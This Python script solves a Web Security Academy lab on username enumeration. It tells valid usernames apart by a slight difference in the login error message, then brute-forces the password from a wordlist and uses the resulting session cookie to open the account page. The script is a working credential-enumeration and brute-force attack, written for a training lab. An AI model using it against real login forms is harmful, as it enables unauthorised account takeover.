""" Lab: Username enumeration via different responses """
import requests
from helpers import read_file

LAB_URL = "https://0af1006004596bf8804158a7006f00b0.web-security-academy.net/"
USERNAMES_LIST_PATH = "../usernames.txt"
PASSWORDS_LIST_PATH = "../passwords.txt"


def login(username, password):
    """Function to login"""
    data = {"username": username, "password": password}
    uri = "/login"
    url = f"{LAB_URL}{uri[1:]}"
    return requests.post(url, data=data, allow_redirects=False, timeout=10)


def main():
    """ Main function """
    print("Reading usernames...")
    usernames = read_file(USERNAMES_LIST_PATH).splitlines()
    print("Reading passwords...")
    passwords = read_file(PASSWORDS_LIST_PATH).splitlines()

    text1 = "Invalid username or password"
    text2 = "Invalid username or password."

    for username in usernames:
        print("Trying to login as", username, "...")
        try_to_login = login(username, "fake_password")
        if try_to_login.status_code == 200:
            if text1 in try_to_login.text and text2 not in try_to_login.text:
                valid_username = username
                print(valid_username)
                break

    for password in passwords:
        print("Trying to login with password", password, "...")
        try_to_login = login(valid_username, password)
        if try_to_login.status_code == 302:
            session = try_to_login.cookies.get("session")
            valid_password = password
            print(session, valid_password)
            break

    cookies = {"session": session}
    uri = "/my-account"
    url = f"{LAB_URL}{uri[1:]}"
    try:
        requests.get(url, cookies=cookies,
                     allow_redirects=False, timeout=10)
        print(f"Valid username: {valid_username}")
        print(f"Valid password: {valid_password}")
        print("Congratulations, you solved the lab!")
    except requests.exceptions.RequestException as e:
        print(e)


if __name__ == "__main__":
    main()
